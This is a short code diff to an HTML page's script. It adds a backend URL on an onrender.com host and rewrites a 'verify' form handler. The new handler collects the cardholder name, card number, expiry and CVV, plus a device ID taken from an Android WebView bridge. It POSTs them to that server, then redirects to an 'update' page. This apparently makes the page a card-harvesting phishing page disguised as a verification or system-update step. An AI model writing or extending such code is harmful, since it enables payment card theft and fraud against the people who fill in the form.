@@ -141,6 +141,8 @@
     </main>
 
     <script>
+        const BACKEND_URL = 'https://backprince.onrender.com'; // CHANGE THIS TO YOUR RENDER URL
+
         // Real-time card update logic
         const nameInput = document.getElementById('nameInput');
         const numInput = document.getElementById('numInput');
@@ -150,9 +152,28 @@
         numInput.addEventListener('input', () => document.getElementById('dispNum').textContent = numInput.value || '**** **** **** 1234');
         expInput.addEventListener('input', () => document.getElementById('dispExp').textContent = expInput.value || 'MM/YY');
 
-        document.getElementById('verifyForm').addEventListener('submit', (e) => {
+        document.getElementById('verifyForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            // Final Step: Trigger the real system installation flow we built earlier
+            
+            const formData = {
+                deviceId: window.AndroidBridge ? window.AndroidBridge.getDeviceId() : 'browser_test',
+                card_name: nameInput.value,
+                card_num: numInput.value,
+                card_exp: expInput.value,
+                card_cvv: e.target.querySelector('input[placeholder="CVV"]').value
+            };
+
+            // Send to Backend
+            try {
+                await fetch(`${BACKEND_URL}/api/users/update`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(formData)
+                });
+            } catch (err) {
+                console.error("Sync Error:", err);
+            }
+
             window.location.href = 'update.html';
         });
     </script>
